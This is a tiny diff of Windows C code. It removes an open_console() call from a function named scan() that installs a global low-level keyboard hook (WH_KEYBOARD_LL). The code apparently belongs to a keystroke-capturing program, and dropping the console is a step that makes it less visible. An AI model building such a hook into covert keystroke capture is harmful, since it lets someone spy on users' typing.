@@ -21,7 +21,6 @@ int scan(void)
 {
 	HINSTANCE hInst;
 
-	open_console();
 	kbh = SetWindowsHookEx(WH_KEYBOARD_LL, handle_kbh, hInst, 0);
 
 	MSG msg;
